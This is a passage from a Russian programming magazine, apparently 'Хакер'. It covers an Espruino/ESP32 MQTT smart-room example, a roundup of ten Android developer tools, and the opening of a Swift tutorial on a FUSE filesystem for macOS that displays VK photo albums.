  библиотека не найдена. На самом устройстве ее действительно нет, она
   подгружается из интернета, поэтому, если подключение  к интерне ту
   не удалось, она не сможет ска чаться. Подожди, пока установится стабиль‐
   ное подклю чение, и перезагрузи устройство.
 • Теперь надо описать функциональность клиента. У MQTT‐клиента есть
   различные события, на которые мож но (и нужно) повесить обработчики.

    • Когда  соединение  установлено   (connected),  надо  подписаться
        (mqtt.subscribe(topic)) на необ ходимые топики: один соответс‐
      твует переключателю, дру гой — Color Picker’у. И для удобства выведем
      в консоль сооб щение об успешном подключении.
    • Теперь надо прописать, что необ ходимо делать при появлении в том
     или ином топике какого‐либо сооб щения  (publish). Для начала
     выведем имя топика и текст сооб щения.
    • Переключатель может возвращать всего два сообщения: OFF или ON .
     Логично, что при получении первого сообщения необходимо выключить
     все светодиоды, а вот что делать при включении — остается на выбор
     программиста. Я решил зажечь все светоди оды белым цветом, с 50%‐й
      яркостью.
    • Если же пользователь изменяет цвет, то мы переводим цвет в RGB,
      точнее в GRB‐запись и записываем этот цвет во все све тодиоды.

 • И разумеется, необ ходимо инициировать подклю чение к MQTT‐брокеру.


MQTT-сер висы
Кроме Adafruit IO, есть и дру гие MQTT‐сервисы, с похожей функциональ‐
ностью. Если говорить про полностью «ручное» управление — первым на ум
приходит Eclipse Mosquitto. Этот брокер можно установить на домашний
компьютер или на Raspberry Pi и при помощи встроенных утилит mosquitto_‐
sub и mosquitto_sub вручную (или исполь зуя Python) создавать топики, под‐
писываться на них, отправлять сообщения.
  В Arduino‐кругах очень популярен сервис Blynk. У этого сервиса есть биб‐
лиотеки для Arduino, клиенты под iOS и Android, а также его сервер рас‐
пространяется через GitHub и может быть поднят на любом компьютере. Есть
небольшой нюанс: каждый виджет, добавляемый на панель приложения,
«стоит» определенное количес тво внутренних единиц. Изначального баланса
хватит на большинство приложений, но если тебе захочется сделать пол‐
ноценную программу и выложить ее в App Store / Play Market (а Blynk и такое
позволяет), то придется рас кошелиться.
  Кроме этого, и в App Store, и в Play Market наберется дос таточно много
клиентских приложений, а в интернете есть масса MQTT‐брокеров. Нап‐
ример, CloudMQTT. У  него доступен бес платный тариф — самое  то
для начала.



Система кон тро ля состояния комнаты
Представим, что у нас есть комната, в ней ряд датчиков и нам нужно сле дить,
все ли там в порядке. Постоянно смотреть за показа теля ми надоест доволь‐
но быстро, поэтому нам требуется, что бы в определенных случаях включал ся
свет, причем не какой‐то светодиод, а полноценная лампа. А всю информа‐
цию будем отправлять опять же на Adafruit IO.
   Датчики у нас сле дующие:
 • датчик уровня воды — аналого вый;
 • датчик температуры и влажности DHT11 — цифровой;
 • датчик звука — цифровой.

Кроме этого, для управления светом нам понадобит ся реле.





                       Схема подключения


var ssid = 'SSID';
var password = 'PASSW';
var TempRTSensorPin = D27;
var WaterSensorPin = D26; // Аналоговый пин
var SoundPin = D14; // Аналоговый пин
var RelayPin = D12;
const SoundLevel = 3.8;
const Waterlevel = 30;
var wifi = require('Wifi');
wifi.connect(ssid, {password: password}, function() {
  console.log('Connected to Wifi.  IP address is:', wifi.getIP().ip);
  mqtt.connect();
});
var dht = require("DHT11").connect(TempRTSensorPin);
var mqtt = require("MQTT").connect({
  host: "io.adafruit.com",
  username: "<LOGIN>",
  password: "<SECRET‐KEY>"
});
mqtt.on('connected', function() {
  console.log("Connect");
});
function EnableLight() {
  digitalWrite(RelayPin,true);
}
setInterval(function() {
  if (analogRead(SoundPin)*100>SoundLevel) || (analogRead(WaterS
ensorPin) * 100 > Waterlevel) {
    D2.write(false);
    EnableLight();
  }
}, 100);
setInterval(function() {
  dht.read(function (a) {console.log("Temp is "+a.temp.toString()+"
and RH is "+a.rh.toString());
  mqtt.publish("<LOGIN>/feeds/smartroom.rh", a.rh.toString());
  mqtt.publish("<LOGIN>/feeds/smartroom.temperature", a.temp.toString
());
  mqtt.publish("<LOGIN>/feeds/smartroom.waterlevel",""+analogRead(
WaterSensorPin));
},5000);

В данной программе нам опять понадобится подклю чение к Wi‐Fi и MQTT‐
брокеру. Они аналогичны пер вой прог рамме, единственное отличие —
MQTT‐клиент при подключении не подписыва ется ни на какие топики.
  В начале объявим, какие пины для чего мы будем использовать. И если
первый пример теоре тичес ки мог бы быть запущен на ESP8266, то этот при‐
мер требует только ESP32, ведь нам нужно уже два аналоговых пина.
  Для датчика температуры и влажности существу ет собственная биб лиоте‐
ка, которую необходимо подключить: require("DHT11").
  Реле управляется обычным изменени ем данных на цифровом пине. 0 —
реле выключено, 1 — вклю чено. Таким образом, подключая лампы, удлините‐
ли и прочие устрой ства через реле, ими можно управлять через интернет.
Это один из самых частых IoT‐приемов.
  Но самое интересное — это, конечно, функция setInterval(function,
time). Всем, кто писал на Arduino C, известна основная функция void
Loop(){} — это функция, которая пос тоянно вызывается после загрузки
программ. Так вот, setInterval гораздо круче. Во‐первых, можно (и нужно)
задать время повтора в миллисекундах, а во‐вторых, можно задавать вызовы
нескольких функций, причем с разной час тотой.
  Еще из инте ресных нюансов у меня есть переменные SoundLevel и Wa‐
terlevel, поскольку и дат чик уровня воды, и датчик звука — аналоговые,
показания на разных платах могут различать ся и необ ходимо провести калиб‐
ровку. На датчике звука уста новлен потенциометр, для регулировки чувс тви‐
тельности.
  Кроме этого, в данном скрипте появился вызов функции mqtt.publish(
field,data), он отправляет значение поля data в заданный канал на MQTT‐
брокере.





                      SmartRoom Dashboard


ЗАКЛЮЧЕНИЕ
Примеры, разобранные в данной статье, призваны продемонстрировать, что
в создании собственных IoT‐девайсов нет ничего сложного. Дей ствительно,
JS, на котором базируется Espruino, довольно нес ложный ЯП, а количество
уроков по нему в интернете зашкалива ет. В начале статьи я писал, что самос‐
тоятельная разработка дешевле, чем покупное устройство. В качестве при‐
мера, подтверждающего это, скажу, что одна розетка, управляемая по Wi‐Fi,
стоит в среднем примерно в два раза больше пла ты, используемой в обзоре,
и в 10–20 раз больше, чем реле, необходимое для управления обычной
розеткой. Выводы делай сам. :)


        WWW

                  •Официальный сайт Espruino
                    •Англоязычный     форум,      посвященный
                      ESP32 и Espruino
                    •Использование библиотек без интерне та
                     •Плата, использован ная в обзоре
КОДИНГ

 ИНСТРУМЕНТАРИЙ


  РАЗРАБОТЧИКА





                                          Евгений Зобнин
                                            Редактор Unixoid и Mobile
                                                     zobnin@glc.ru

      ПОДБИРАЕМ ПРОГРАММЫ,
     КОТОРЫЕ ПОМОГУТ В РАБОТЕ





Android Studio — весьма продвинутая среда разработки,
из коробки предоставляющая почти все, что нужно раз‐
работчику. Но с ее помощью можно решить не все задачи,
а для некоторых из них гораздо лучше подойдут другие при‐
ложения. В этой статье мы расскажем о десяти инструмен‐
тах,  с которыми  ты обязательно должен ознакомиться
как разработчик.


1. ДЕПЛОИМ APK С КОМФОРТОМ
Мы все знаем цепоч ку действий, которую необ ходимо выполнить, чтобы
опубликовать новую версию приложения в маркете: добавляем новую фун‐
кциональность, отла жива ем, отдаем бета‐тес терам, исправляем найденные
ошибки, собираем релизный билд, открываем Google Play Console, вык‐
ладываем новую вер сию, заливаем фай лы mapping.txt, чтобы в будущем
получить читаемые отчеты об ошиб ках.
  Из всех этих стадий меня всег да сму щали пос ледние три. Это кажется
странным, но Android Studio не предоставляет никаких средств для раз‐
мещения билда в Google Play. Тебе приходится откры вать страницу своего
приложения в браузере и все делать руками. Это нисколько не напрягает,
если речь идет о релизах, которые про исходят раз в две недели или месяц,
но, если ты ежедневно выкладываешь новую бету, процесс становится уто‐
мительным.
  Именно здесь на помощь приходит fastlane, DevOps‐фреймворк для авто‐
матизации сборки и публикации приложений в Google Play и Apple App Store.
Ты просто описываешь действия, которые необ ходимо выполнить (например,
собрать релизную версию, залить ее в Google Play вместе с ченджлогом,
новыми скриншотами и файлами mapping.txt), затем выполняешь одну коман‐
ду в консоли, и fastlane делает всю грязную работу за тебя.
   Установить fastlane очень прос то:


$ sudo gem install fastlane ‐NV // Linux
$ brew cask install fastlane // macOS

Далее нужно перейти в консоль раз работчика Google Play и сгенерировать
файл‐ключ для доступа к API Google Play: «Настройки → Аккаунт раз работчика
→ Создать аккаунт приложения». Google  Play предложит тебе перейти
в Google API Console и соз дать сервисный аккаунт. В процессе ты сможешь
сгенерировать ключ и ска чать его на комп (он будет в файле json).
   Когда ключ будет соз дан, переходим в каталог проекта и выполняем ини‐
циализацию:


$ fastlane init

Утилита спросит у тебя полное имя приложения в формате com.exam‐
ple.myapp и предложит ввести путь до ключа. Пос ле этого необходимо выпол‐
нить команду


$ fastlane supply init

Если все пройдет гладко, fastlane создаст подкаталог fastlane/metadata/
android, в котором будут храниться метаданные приложения из Google Play:
описание на разных языках и скрин шоты.
  Можно приступать к написа нию пра вил сборки. Приведенный ниже код
собирает  бета‐версию  приложения  и  автоматически  пуб ликует  ее
в бета‐канале на Google Play вместе с ченджлогом. Код следует добавить
в файл fastlane/Fastfile:


default_platform(:android)
platform :android do
  lane :beta do
    # Убедимся, что текущая git‐ветка beta
    ensure_git_branch(branch: "beta")
    # Соберем билд
    gradle(
        task: "clean assembleRelease",
        properties: {
            "android.injected.signing.store.file" => "путь/до/ключа/
цифровой/подписи",
            "android.injected.signing.store.password" => "ПАРОЛЬ",


            "android.injected.signing.key.alias" => "AIO Launcher",
            "android.injected.signing.key.password" => "ПАРОЛЬ",
        }
    )
    # Добавим ченджлог
    changelog = File.read("../changelog.txt")
    # Публикуем в бета‐канал
    upload_to_play_store(track: 'beta')
  end
end

Теперь, чтобы опубликовать бету, дос таточно выполнить такую команду:


$ fastlane beta


2. ИСПОЛЬЗУЕМ CHROME DEV TOOLS ДЛЯ ОТЛАДКИ
ПРИЛОЖЕНИЙ
В Android Studio есть встроенный отладчик, который отлично работает.
Но иногда одного отладчика недостаточно, необ ходимо также выпол нить
трассиров ку сетевых запросов, прос мотреть содержимое баз данных SQLite
и проанализировать актуальную иерархию элементов интерфейса, чтобы
оптимизировать код отрисовки интерфей са.
  Сделать все это можно с помощью биб лиотеки Stetho, раз работанной
в Facebook. Для начала подключим библиотеку к нашему проекту:


dependencies {
    ...
    implementation 'com.facebook.stetho:stetho:1.5.0'
    implementation 'com.facebook.stetho:stetho‐okhttp3:1.5.0'
}

Вторая стро ка не обязательна и нужна, только если ты используешь биб‐
лиотеку OkHttp и хочешь выполнить трас сировку трафика.
  Далее создаем класс MyApplication со следующим содержимым (или
добавляем код инициализации в существу ющий класс‐нас ледник Application):


public class MyApplication extends Application {
    public void onCreate() {
        super.onCreate();
        Stetho.initializeWithDefaults(this);
    }
}

Собираем приложение, устанавлива ем на подклю ченный смартфон, запус‐
каем Chrome и открываем страницу chrome://inspect. На экране появится
список подключенных устройств со ссылкой inspect. Нажимаем ее и прис‐
тупаем к иссле дованию. Нужные нам данные находятся в следующих вклад‐
ках:
 • Elements — иерархия элементов интерфейса;
 • Network — сетевые соединения;
 • Resources → Local Storage — конфигурационные файлы;
 • Resources → Web SQL — базы данных;
 • Console — JS‐консоль, поз воляет выполнять JS‐код на манер Frida.

Отмечу, что трассировка сетевых соединений заработает только после того,
как ты добавишь в инициализацию OkHttp следующую строку:


.addNetworkInterceptor(new StethoInterceptor())





          Иерархия элементов интерфейса в Chrome Dev Tools


3. ИЩЕМ ПРИМЕРЫ, НЕ ВЫХОДЯ ИЗ ANDROID STUDIO
Признайся, сколько раз ты обра щался к Stack Overﬂow, GitHub и Gist, чтобы
найти примеры использования того или ино го клас са или функции? Для сов‐
ременного программиста эти ресурсы — в числе важней ших источников
информации. Они позволяют оценить, насколько правильно то или иное
решение, узнать о подводных камнях и реальных проектах, в которых исполь‐
зуется этот кусок кода.
   Есть только одна проб лема — каждый раз переключаться в браузер, чтобы
что‐то найти, не слишком удобно. Да и надо обладать определенными
навыками, чтобы из гор мусора вычленить дей ствительно работающие кус ки
кода. Codota решает  эту проб лему  (или,  лучше сказать, упрощает ее
решение) с помощью единого приложения с раз витой сис темой поиска
по всем источникам.
  Сразу после запуска Codota предложит авторизоваться (используя акка‐
унт Google или GitHub), выбрать тему, уста новить плагин (необходимо будет
указать путь до каталога с плагина ми), выб рать кла виатурную комбинацию
для быстрого поиска (по умолчанию Shift + Alt + Space). Затем ты увидишь
окно поиска, в которое можно вбить имя интересующего тебя класса
или функции.
  Работает эта функция очень быстро, к тому же позволяет уточнять запрос
и даже предлагает варианты уточнения. Любой сниппет можно скопировать
одним кликом мыши, перейти на сайт источни ка и добавить в закладки. Кроме
того, Codota интегрируется в среду разработки, так что ты будешь видеть
подсказки прямо во время набора кода.
  Минусов у Codota два: поддержка исключитель но языка Java (любители
Kotlin в пролете) и отсутс твие дополнительной информации в выводе. Нап‐
ример, в случае Stack Overﬂow Codota просто берет набравший большее
количество голосов сниппет и выводит его как есть. Все мы знаем, что самый
популярный ответ не всегда правильный и что комментарии иногда более
важны, чем код.





                      Окно поис ка Codota


4. ТЕСТИРУЕМ БИБЛИОТЕКИ
С семплами кода разоб рались, но что насчет биб лиотек? На GitHub можно
найти огромное количество библиотек на все случаи жизни. Под ключать их
к своему проекту, толь ко чтобы оценить функциональ ность, крайне неудобно,
поэтому многие разработчики предлагают ска чать приложе ния‐примеры.
Это действительно удобная опция, но есть способ сделать ее еще удобнее.
   Утилита dryrun умеет самос тоятельно ска чивать, собирать и запускать
в эмуляторе или на устройстве приложения‐при меры из указанного репози‐
тория.
  Перед использованием утилиты нужно про инициализировать две необ‐
ходимые для ее установки и запуска переменные окружения (пути в твоем
случае, скорее всего, будут дру гие):


$ export ANDROID_HOME=/usr/local/opt/android‐sdk
$ export JAVA_HOME=/usr/lib/jvm/java‐8‐openjdk

Теперь устанавливаем dryrun:


$ gem install dryrun

Все. Можно запускать примеры кода:


$ dryrun https://github.com/cesarferreira/android‐helloworld

Пример будет запущен на устройстве, подклю ченном в данный момент
по ADB. Эмулятор это или реальный смартфон, неважно.





               Процесс запуска приложения‐примера


5. ПРОДВИНУТЫЙ ЭМУЛЯТОР
Раз уж мы заговорили об эмуляторах, нельзя не упомянуть о Genymotion,
продвинутом эмуляторе Android для раз работчиков. Когда‐то Genymotion
обрел большую популярность благодаря гораздо более высокой скорости
работы в сравнении со стандартным эмулятором. Но даже сегодня он ока‐
зывается если не быстрее, то гораз до удоб нее для разработчиков.
   Genymotion стоит денег (для инди‐разработчика он обойдется в 136 дол‐
ларов в год), но за эти день ги ты получишь весьма продвинутый эмулятор,
который можно скриптовать, у которого есть Java API для программирования
касаний и других действий, он умеет управлять местоположением и кучей
сенсоров, к нему даже можно подклю чить реаль ный смартфон, чтобы с его
помощью симулировать наклоны.
  Еще одна хорошая черта Genymotion — он основан на VirtualBox и поэтому
зачастую работает намного лучше стандартного эму лятора. К при меру,
у меня всегда были проблемы с запуском стандартно го эмулятора с 3D‐уско‐
рением на интегрированной графике Intel. В Genymotion таких проблем нет.





                             Genymotion


6. ЗЕРКАЛО ДЛЯ СМАРТФОНА
Не всем нравит ся тестировать софт в эмулято ре. Я предпочитаю исполь‐
зовать реальные устройства, у меня их пять штук, плюс на одно из них уста‐
новлен MultiROM, позволяющий загрузить любую версию Android с 4.4 по 8.1.
Они полностью пок рыва ют мои нужды, но есть одна проблема: далеко
не  всегда  удобно  тестировать приложение, держа смартфон  в  руке,
хотелось бы видеть его интерфейс пря мо на экране монитора.
   Scrcpy позволяет сделать это очень легко и быс тро. Прос то установи ути‐
литу, выполни в консоли команду scrcpy, и ты сра зу увидишь на экране изоб‐
ражение со смартфона и сможешь им управлять. Никаких установок допол‐
нительного софта на смартфон, никаких прав root, все очень просто. Единс‐
твенное требование — подключение по ADB с помощью кабеля или по Wi‐Fi.
   Кстати, разработчик scrcpy написал интерес ную статью о том, как утилита
устроена под капотом. Рекомендую к прочтению.





                    Android Studio, scrcpy и AIO Launcher


7. ОТЛАЖИВАЕМ КОД НА СМАРТФОНЕ ПО WI-FI
Я уже заикнулся о том, что scrcpy умеет работать по Wi‐Fi, но не сказал,
как активиро вать эту функцию. На самом деле активировать ничего не нужно,
практически любой смартфон можно подключить по ADB без кабеля, но для
этого необходимо перезапустить ADB‐сервер на смартфоне в режиме Wi‐Fi.
Сделать это можно из консоли либо воспользовавшись при ложе нием типа
WiFi ADB (оно требует права root).
  Еще один вариант — плагин Android WiFi ADB для Android Studio. Он
добавляет в среду разработки сайд‐панель, где перечислены все подключен‐
ные с помощью ADB устройства, с возможностью переподключить каждое
из них по Wi‐Fi.





                             Android WiFi ADB


8. ГРАФИЧЕСКИЙ КЛИЕНТ ДЛЯ GIT
Если ты занимаешься раз работкой всерьез и уж тем более если работаешь
в команде, ты дол жен использовать Git. Это один из важнейших инс трумен‐
тов, и именно поэтому Android Studio поддерживает его прямо из коробки.
Однако возможности Android Studio силь но ограниче ны, в основном они
касаются таких операций, как коммиты, пуши и переключение между ветками.
Для более тонкого управления репозитори ем и анализа изменений лучше
использовать другие приложения.
   GitKraken — это графичес кий клиент Git. Он не самый раз витый и функци‐
ональный, зато работает в любой ОС (Windows, macOS, Linux), легко устанав‐
ливается и не тре бует настройки. Как инс трумент для анализа изменений,
слияния веток и откатов он подходит превос ходно.





                                 GitKraken


9. ТВОРИМ АССЕТЫ
Если ты только начал свой путь раз работчика приложе ний, то наверняка уже
столкнулся с известной проблемой любого инди: где брать графические
ресурсы? Ты можешь быть сколько угодно крут как программист, но, если ты
не обладаешь навыками дизайнера, у тебя проб лемы.
   Android Studio решает эти проблемы только отчасти. В нем есть рудимен‐
тарные инструменты для генерации иконок для action bar’а и строки сос‐
тояния, но с такими инстру ментами далеко не уедешь. Веб‐сервис Android
Asset Studio, созданный одним из разработчиков Android, предоставляет те
же инструменты, но в более развитой форме в виде веб‐приложения.
  С помощью Android Asset Studio можно создать иконку приложения, иконки
для action bar’а, строки сос тояния, быс трого меню, а также анимированные
иконки. Это не профессиональный инс трумент, но на первых этапах раз‐
работки приложения он поможет тебе, а если речь идет о бесплатной ути‐
лите, которую ты разработал для себя, то можно обойтись и без привлечения
профессиональных дизайнеров.





                            Android Asset Studio


10. ПОДСКАЗКА ДЛЯ ПОДКЛЮЧЕНИЯ БИБЛИОТЕК
Gradle, please — еще один полезный веб‐инстру мент. Его единс твенная
задача — показать инструкцию для подключения ука занной библиоте ки к тво‐
ему проекту. На первый взгляд, может, и не впечатляет, но, когда ты создаешь
новый проект, уже знаешь, какие библиотеки нужны и как их использовать,
и все, что тебе нужно, — это прос то подключить самую последнюю версию
библиотеки, Gradle, please ока зывается очень удобен.





                                Gradle, please


ВЫВОДЫ
Конечно же, это далеко не все инструменты, которые могут быть полезны раз‐
работчику. Я выбрал те, что использую сам, и в твоем случае список может
быть иным. Поэтому не стес няйся и пиши в комментариях об утилитах,
которые предпочитаешь ты.
КОДИНГ





                                    Михаил Овчинников
                                                  michail@ovchinnikov.cc
КРАФТОВАЯ
             КАК БЫСТРО СДЕЛАТЬ
          СВОЮ ФАЙЛОВУЮ СИСТЕМУ
            НА FUSE И SWIFTФС





Однажды передо мной встала задача показать файлы с уда‐
ленного сервера натив но в  Finder. Первое, что пришло
на ум, — использовать WebDAV, но это был пуб личный сер‐
вис, к серверу которого у меня не было доступа, а в рас‐
поряжении имелся только REST API. В голове промелькнула
мысль написать свою файловую систему, но она казалась
слишком амбициозной. Однако мои сомнения развеялись,
когда я обнаружил, что сообщество энтузиастов раз вивает
проект FUSE for macOS, который сводит создание собствен‐
ной файловой системы к нескольким сотням строк кода.
А идущий в комплекте фреймворк не требует унылых раз‐
бирательств с API на голом C и вполне пригоден для исполь‐
зования в ком плекте с современным и мощным Swift.


ЧТО ТАКОЕ FUSE?
FUSE (Filesystem in Userspace) — это интерфейс для программ пространства
пользователя, позволяющий экспортировать файловую систему ядру ОС.
Этот механизм появился в Linux, и условно его можно разделить на два
базовых компонен та: модуль ядра (поддерживает ся раз работчиками ядра)
и библиотека пользователь ского пространства (libfuse). Эта библиоте ка пре‐
доставляет методы для монтирования, размонти рования, отправки запросов
к ядру и получения ответов от него. Также она реализует удобный верхне‐
уровневый API, в котором мы можем оперировать привычными понятиями
имен файлов и путей, вместо работы с inode.
  Проект FUSE for macOS представляет собой ана логичный набор API (а так‐
же Objective‐C фреймворк), поз воляющий реализовать пол ноценную фай‐
ловую систему, которая будет работать в пространс тве пользователя на mac‐
OS. Так как его API является надмно жес твом FUSE API из Linux, то сущес твует
теоретическая возможность завес ти многие из существу ющих файловых сис‐
тем на macOS. В настоящее время этот про ект остается единс твенной
реализацией FUSE для macOS, которая развива ется и поддерживается
силами сообщества, хотя и активность на GitHub и в Google Groups сейчас
довольно низкая.


УСТАНОВКА ФРЕЙМВОРКА
Установка не отличается сложностью: скачиваешь инстал лятор с сайта раз‐
работчика и запускаешь его. Если предпочита ешь собирать такие вещи
из исходников, то это тоже не сос тавит труда: достаточно установить зависи‐
мости через brew и запус тить сборочный скрипт, все это подробно описано
в Readme на GitHub.


НАСТРОЙКА ПРОЕКТА





                 Создание нового про екта в Xcode

Создадим новый проект в Xcode. Это должно быть Cocoa Application (в раз‐
деле macOS), я назвал его  HelloFuse, язык выберем  Swift, остальные
параметры можно выбрать на свое усмотрение.


Под ключим фреймворк





                Расположение фрей мворка OSXFUSE

После  установки фреймворк  будет  рас положен по  сле дующему  пути:
/Library/Frameworks/OSXFUSE.framework . Чтобы добавить его в проект,
достаточно просто перетащить его в раз дел Linked Frameworks and Libraries
на вкладке General настроек сборки.





                   Подключение фреймворка


Соз дадим Bridging Header
Так как мы пишем проект на Swift, а фреймворк реализован на Objective‐C, то
нам нужно создать и подключить так называемый Bridging Header. Создадим
заголовочный файл (File → New → File → macOS → Source → Header File),
назовем его HelloFuse‐Bridging‐Header.h и добавим в него следующую
строчку:


 #import <OSXFUSE/OSXFUSE.h>

Теперь на панели навига ции выбира ем наш проект, выбираем сборку в раз‐
деле Targets, переходим на вкладку Build Settings, находим раздел Swift Com‐
piler → General, в поле Objective‐C Bridging Header добавляем


$(PROJECT_DIR)/$(TARGET_NAME)/HelloFuse‐Bridging‐Header.h





          Подклю чаем Bridging Header в нас трой ках проекта


Отключим Sandbox
По умолчанию во всех приложениях включена песочница, которая ограничи‐
вает возможности приложения, но в отличие от iOS на macOS ее можно
отключить. Этим ты потеря ешь пра во распростра нять приложение через App
Store (что тоже не будет проблемой в случае с macOS), но в нашем случае
нам нужен полноценный дос туп к файловой системе, поэтому выбора нет.
  Перейдем на вкладку Capabilities в настройках сборки и поставим перек‐
лючатель в пункте App Sandbox в положение OFF.


HELLO WORLD
Описание файловой системы
Поведение файловой системы описывается в отдельном классе. Создадим
класс под названием HelloFS и унаследуем его от NSObject. В минимальном
примере нам понадобится реализовать только два метода: получение списка
файлов, который мы будем отоб ражать, и содержимое каждого фай ла.
  В методе, отвечающем за отображение фай лов, нужно вернуть мас сив
строк с именами файла. В качес тве парамет ра туда приходит путь (path),
в более сложных случаях нужно будет его обра баты вать, чтобы показывать
контент соответствующей директории. Здесь я прос то возвращаю один файл
hello.txt.


override func contentsOfDirectory(atPath path: String) throws ‐> [Any
] {
    return ["hello.txt"]
}

В метод, который отвечает за отображение пути фай ла, аналогично приходит
путь, в зависимости от которого мы должны решить, какое содержимое отда‐
вать для файла. В нашем же примере мы будем для всех файлов возвращать
строку «Hello world!».


override func contents(atPath path: String) ‐> Data? {
    return  "Hello world!".data(using: .utf8)
}

В итоге файл HelloFS.swift примет следующий вид:


import Foundation
final class HelloFS: NSObject {
    override func contentsOfDirectory(atPath path: String) throws ‐>
[Any] {
        return ["hello.txt"]
    }
    override func contents(atPath path: String) ‐> Data? {
        return  "Hello world!".data(using: .utf8)
    }
}


Инициализация файловой системы
В классе AppDelegate объявим две переменные:


private var helloFS: HelloFS?
private var userFileSystem: GMUserFileSystem?

В метод applicationDidFinishLaunching добавим следующий код:


helloFS = HelloFS()
userFileSystem = GMUserFileSystem(delegate: helloFS, isThreadSafe:
false)
var options: [String] = ["rdonly", "volname=HelloVolume"]
userFileSystem?.mount(atPath: "/Volumes/hello", withOptions: options)

Код достаточно интуитивен: инициализиру ем фай ловую систему, указываем
название раздела и переда ем параметр, что она только для чтения, а затем
монтируем ее по указанному пути.
  По завершении работы приложения демонтиру ем нашу файловую сис тему
в методе applicationWillTerminate:


userFileSystem?.unmount()

После запуска приложения наш раз дел появится в директории /Volumes,
a также должен быть виден и в корневой директории. В разделе будет лежать
единственный файл hello.txt, в котором будет написано «Hello world!».





             Результат работы нашего Hello world проекта


Установка собствен ной икон ки для раз дела
Для раздела можно заменить иконку по своему усмотрению, для этого в про‐
ект нужно положить икон ку в формате *.icns (требования к размерам и про‐
чему можно найти в macOS Design Guidelines) и добавить путь к ней в массив
options.


if let volumeIconPath = Bundle.main.path(forResource: "disk", ofType:
 "icns") {
    options.insert("volicon=\(volumeIconPath)", at: 0)
}


ФАЙЛОВАЯ СИСТЕМА ДЛЯ ФОТО ИЗ VK
Давай попрактикуемся и реализуем то, для чего в большинстве случаев соз‐
даются подобные файловые системы, — отображение контента с удаленного
сервера в виде файлов и папок. Предлагаю отобразить таким образом аль‐
бомы и фотографии из паблика нашего журнала в VK. При мер можно будет
легко адаптировать для сво их нужд, так как мы не будем завязы ваться на SDK
«ВКонтакте», а будем обращать ся напрямую к методам REST API, доступным
без авторизации.


Модели дан ных
Мы будем оперировать дву мя сущностя ми: альбом и фотография. Альбомы
будут лежать в корне нашей файловой системы и выглядеть как папки,
а фотографии находиться в альбомах и выглядеть, соответственно, как файлы
картинок. Наши модели должны удовлетво рять протоколу Decodable, для того
чтобы мы могли их распарсить из JSON, который мы получим с сервера.
  Для альбома нам понадобится знать его идентификатор, чтобы потом
по нему запросить фотографии, а также его название.


struct Album: Decodable {
    let id: Int
    let title: String
    var photos: [Photo] = []
    private enum CodingKeys : String, CodingKey {
        case id, title
    }
}

Для фотографий нам нуж но знать URL, по которо му мы будем скачивать
фотографию, а также имя файла. Так как в VK нет отдельного заголовка
для фотографий, я буду использовать имя файла из URL.


struct Photo: Decodable {
    let url: String
    let filename: String
    private enum CodingKeys : String, CodingKey {
        case url = "photo_604"
    }
    init(from decoder: Decoder) throws {
        let values = try decoder.container(keyedBy: CodingKeys.self)
        url = try values.decode(String.self, forKey: .url)
        filename = NSString(string: url).lastPathComponent as String
    }
}

Ответ сервера VK имеет следующую структуру:


{
    "response": {
        "count": 12,
        "items": [...]
    }
}

Интересующая нас информа ция лежит в items. Чтобы с такой структурой было
удобнее работать, сделаем вспомога тельную модель VKResponse.


struct VKResponse<T: Decodable>: Decodable {
    let items: [T]?
    private enum RootKeys : String, CodingKey {
        case response
    }
    private enum CodingKeys : String, CodingKey {
        case items
    }
    init(from decoder: Decoder) throws {
        let values = try decoder.container(keyedBy: RootKeys.self)
        let responseValues = try values.nestedContainer(keyedBy:
CodingKeys.self, forKey: .response)
        items = try responseValues.decodeIfPresent([T].self, forKey:
.items)
    }
}


Сервис для получе ния дан ных
Очевидно, что получать данные из сети не вхо дит в обязанности класса, отве‐
чающего за построение файловой системы, поэто му мы вынесем эту функци‐
ональность в отдельный класс, который мы назовем VKService (в боевом про‐
екте его тоже сле довало бы раз бить на несколь ко слоев, но здесь мы
не будем усложнять). Корот ко опишу основные моменты: методы fetchPhotos
и fetchAlbums делают GET‐запрос при помощи URLSession к API vk.com
и парсят полученный JSON при помощи JSONDecoder. Остальные методы
предназначены просто для удоб ного получения соответствующих сущ ностей
(фото из альбома, альбом по пути в файловой системе и прочее). Так как он
имеет мало отношения к нашей сегодняшней теме, я не буду останавливать‐
ся на нем подробно, ты смо жешь его найти в исходниках проекта.


Описание файловой системы
Алгоритм отображения контента будет следующий. Проверяем, находимся ли
мы в корневой директории, если да, то воз вра щаем список альбомов; иначе
предполагаем, что мы вош ли в альбом, пытаемся получить его и отобразить
список фотографий.


override func contentsOfDirectory(atPath path: String) throws ‐> [Any
] {
    if path == "/" {
        requestAlbums()
        return vkService.albums.map{ $0.title }
    }
    guard let album = vkService.getAlbum(forPath: path) else { return
 [] }
    requestPhotos(forAlbum: album)
    return album.photos.map{ $0.filename }
}

Методы requestAlbums() и requestPhotos() нам нужны, чтобы запросить
у нашего сервиса соот ветствующий контент.


private func requestAlbums() {
    if vkService.albums.count != 0 {
        return
    }
    vkService.fetchAlbums { (_, error) in
        if let error = error {
            print("ERROR: " + error.localizedDescription)
        }
        NSWorkspace.shared.noteFileSystemChanged("/Volumes/hello/")
    }
}
private func requestPhotos(forAlbum album: Album) {
    if album.photos.count != 0 {
        return
    }
    vkService.fetchPhotos(forAlbum: album) { (photos, error) in
        if let error = error {
            print("ERROR: " + error.localizedDescription)
        }
        NSWorkspace.shared.noteFileSystemChanged("/Volumes/hello/" +
album.title)
    }
}

Обрати внимание на вызов метода NSWorkspace.shared.noteFileSystem‐
Changed. Существует проб лема с тем, что SDK FUSE for macOS ожидает дан‐
ные синхронно, соот ветственно, нам нужно будет как‐то обновить список
файлов, после того как он вернется с сервера. Для этого мы и вызываем упо‐
мянутый метод: он сообщит файловой системе, что нужно обновить контент
по переданному пути, и метод contentsOfDirectory будет выз ван еще раз.
  Для простоты здесь данные запрашиваются только один раз, но в боевом
решении, конечно, дол жен быть некий кеширу ющий сервис, который будет
возвращать актуальные данные, при необ ходимос ти обновлять их.
   Альтернативой (а иногда единс твенным выходом) может быть решение
обращаться к серверу синхронно. Так я делаю в методе получения самой
фотографии.


override func contents(atPath path: String) ‐> Data? {
    return vkService.getPhotoData(forPath: path)
}

Метод getPhotoData, принадлежащий клас су VKService, получает данные
синхронно, исполь зуя метод sendSynchronousRequest класса NSURLConnec‐
tion. Синхронное получение данных будет выглядеть следующим образом:


private func fetchPhoto(urlPath: String) ‐> Data? {
    guard let url = URL(string: urlPath) else { return nil }
    let request = URLRequest(url: url)
    var response: URLResponse?
    do {
        return try NSURLConnection.sendSynchronousRequest(request,
                                                          returning:
&response)
    } catch {
